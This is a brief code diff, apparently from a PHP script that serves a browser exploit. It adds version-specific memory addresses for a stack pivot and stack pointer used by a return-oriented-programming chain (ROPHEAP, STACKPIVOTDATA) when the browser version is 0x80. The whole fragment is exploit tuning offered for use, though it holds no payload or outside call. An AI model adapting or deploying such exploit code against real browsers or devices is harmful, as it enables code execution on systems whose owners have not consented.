@@ -26,6 +26,13 @@ else
 $STACKPIVOTDATA_ADR = 0x08e20800;
 $STACKPTR_ADR = 0x08f73014;
 
+if($browserver == 0x80)
+{
+	//below addrs = newer_addrs - 0x9000
+	$STACKPIVOTDATA_ADR = 0x08e17800;
+	$STACKPTR_ADR = 0x08f6a014;
+}
+
 $ROPHEAP = $STACKPIVOTDATA_ADR;
 
 $STACKPIVOTDATA = "\"";
